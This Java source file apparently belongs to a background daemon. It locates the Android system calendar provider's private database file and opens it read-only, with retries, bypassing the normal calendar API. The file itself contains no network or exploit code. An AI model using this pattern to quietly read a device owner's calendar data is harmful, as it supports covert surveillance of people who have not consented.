package com.vvt.calendar;

import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteException;

import com.vvt.daemon.util.Customization;
import com.vvt.database.VtDatabaseHelper;
import com.vvt.logger.FxLog;

public class CalendarDatabaseHelper {

	private static final String TAG = "CalendarDatabaseHelper";
	private static final boolean LOGV = Customization.VERBOSE;
	private static final boolean LOGE = Customization.ERROR;
	
	private static final String DEFAULT_PACKAGE_NAME = "com.android.providers.calendar";
	private static final String DEFAULT_DB_NAME = "calendar.db";
	
	public static final String TABLE_CALENDAR_METADATA = "calendarmetadata";
	
	public static final String COLUMN_LOCAL_TIMEZONE = "localTimezone";
	
	private static String sDbPath = null;
	
	public static String getDbPath() {
		if (sDbPath == null) {
			String dbPath = VtDatabaseHelper.getSystemDatabasePath(DEFAULT_PACKAGE_NAME);
			if (dbPath != null) {
				sDbPath = String.format("%s/%s", dbPath, DEFAULT_DB_NAME);
			}
			if (LOGV) FxLog.v(TAG, String.format("getDbPath # sDbPath: %s", sDbPath));
		}
		return sDbPath;
	}
	
	public static SQLiteDatabase getReadableDatabase() {
		return openDatabase(SQLiteDatabase.OPEN_READONLY | SQLiteDatabase.NO_LOCALIZED_COLLATORS);
	}
	
	private static SQLiteDatabase openDatabase(int flags) {
		if (sDbPath == null) {
			sDbPath = getDbPath();
		}
		
		SQLiteDatabase db = tryOpenDatabase(flags);
		
		int attemptLimit = 5;
		
		while (db == null && attemptLimit > 0) {
			if (LOGV) FxLog.v(TAG, "Cannot open database. Retrying ...");
			try { Thread.sleep(1000); } 
			catch (InterruptedException e) { /* ignore */ }
			
			db = tryOpenDatabase(flags);
			
			attemptLimit--;
		}
		
		return db;
	}
	
	private static SQLiteDatabase tryOpenDatabase(int flags) {
		SQLiteDatabase db = null;
		try {
			db = SQLiteDatabase.openDatabase(sDbPath, null, flags);
		}
		catch (SQLiteException e) {
			if (LOGE) FxLog.e(TAG, e.toString());
		}
		return db;
	}
}
